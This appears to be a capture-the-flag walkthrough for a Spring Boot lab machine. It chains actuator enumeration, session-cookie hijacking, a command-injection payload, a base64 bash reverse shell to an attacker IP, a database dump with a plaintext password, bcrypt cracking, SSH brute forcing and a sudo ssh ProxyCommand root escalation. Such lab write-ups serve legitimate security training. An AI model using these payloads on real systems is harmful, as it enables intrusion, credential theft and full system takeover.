# Recon & Enumeration:

nmap -sV -sC <TARGET_IP>

Open the website in your browser:

http://<TARGET_IP>
------------------------------------------------------------------------------------------------------------------------------
# Web Discovery

Browse to any non-existent page like http://<TARGET_IP>/asdfasdf. You'll see:

"Whitelabel Error Page
This application has no explicit mapping for /error, so you are seeing this as a fallback.

Google "whitelabel error page" → this tells you Spring Boot is running."

------------------------------------------------------------------------------------------------------------------------------
# Actuator Endpoint Enumeration

gobuster dir -u http://<TARGET_IP>/actuator/ -w /usr/share/wordlists/dirbuster/medium.txt

http://<TARGET_IP>/actuator/sessions

------------------------------------------------------------------------------------------------------------------------------
# Session Hijacking
 Hijack kanderson's session using Burp Suite:

Open Burp Suite → turn on Intercept
In your browser, navigate to http://<TARGET_IP>/login
Intercept the request in Burp Suite
Find the Cookie: JSESSIONID=... header
Replace the JSESSIONID value with kanderson's session ID you copied
Forward the request
Now navigate to http://<TARGET_IP>/admin (with the stolen cookie still set)

-----------------------------------------------------------------------------------------------------------------------------
# Command Injection

host=10.10.10.5&username=;{sleep,10};
------------------------------------------------------------------------------------------------------------------------------
# Exploitation:

echo "bash -i  >& /dev/tcp/<YOUR_ATTACK_IP>/4444  0>&1  " | base64

 Start your reverse listener:

ncat -lvnp 4444

Send the payload via Burp Suite Repeater:


host=10.10.10.5&username=;echo${IFS}"BASE_64"|base64${IFS}-d|bash;

Check your listener — you now have a reverse shell as the app user!
------------------------------------------------------------------------------------------------------------------------------
# Post-Exploitation

ls /app/    

 You'll see: cloudhosting-0.0.1.jar

Transfer the JAR to your attack machine:

cd /app
python3 -m http.server 9999

wget http://172.18.0.2:9999/cloudhosting-0.0.1.jar

unzip cloudhosting-0.0.1.jar


Now read the Spring Boot config file:
cat BOOT-INF/classes/application.properties
------------------------------------------------------------------------------------------------------------------------------
# Database Looting
PGPASSWORD='Vg&nvzAQ7XxR' psql -h localhost -U postgres -d cozyhosting -c 'SELECT * FROM users;'

echo 'HASH' > hashes.txt

john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

cat /etc/passwd 

echo -e "root\npostgres\napp\njosh" > users.txt

hydra -L users.txt -p manchesterunited ssh://<VICTIM_IP>
------------------------------------------------------------------------------------------------------------------------------
# Lateral Movement
ssh josh@<VICTIM_IP>

sudo -l 
------------------------------------------------------------------------------------------------------------------------------
# Privilege Escalation

sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

cd root

cat root.txt
------------------------------------------------------------------------------------------------------------------------------
